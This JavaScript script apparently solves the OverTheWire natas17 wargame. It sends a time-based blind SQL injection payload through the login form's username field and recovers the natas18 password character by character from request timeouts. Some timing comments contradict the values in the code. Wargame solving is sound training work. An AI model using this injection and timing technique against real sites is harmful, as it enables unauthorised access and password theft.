url = 'http://natas17.natas.labs.overthewire.org/index.php';
pass_len = 32; //Password length
charset = "0123456789" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz"; //Set of chars to bruteforce letter by letter
passwd = "";
counter = 0;
data = new FormData();


while(passwd.length < pass_len) {
	for (i=0;i<charset.length;i++) {
		(function(i) {
		injected_query = `natas18" and if(password LIKE BINARY "${passwd+charset[i]}%",sleep(10),'False');-- -`
		data.set('username',injected_query);
		xhr = new XMLHttpRequest(); // https://stackoverflow.com/a/48716403/7908040 Need new xhr request, otherwise it'll interrupt and reuse same object
		xhr.open('POST',url,true);
		xhr.send(data);
		xhr.timeout = 3500; // Set timeout to 4.5 seconds
		xhr.ontimeout = function () { 
			console.log(`Password character found: ${charset[i]}`);
			passwd += charset[i];
		}
		})(i);

	};
	await new Promise(resolve => setTimeout(resolve, 5000)); // 15 sec
	// https://stackoverflow.com/a/51482993/7908040 Can only make it work with long delays
}

console.log(`Password is ${passwd}`);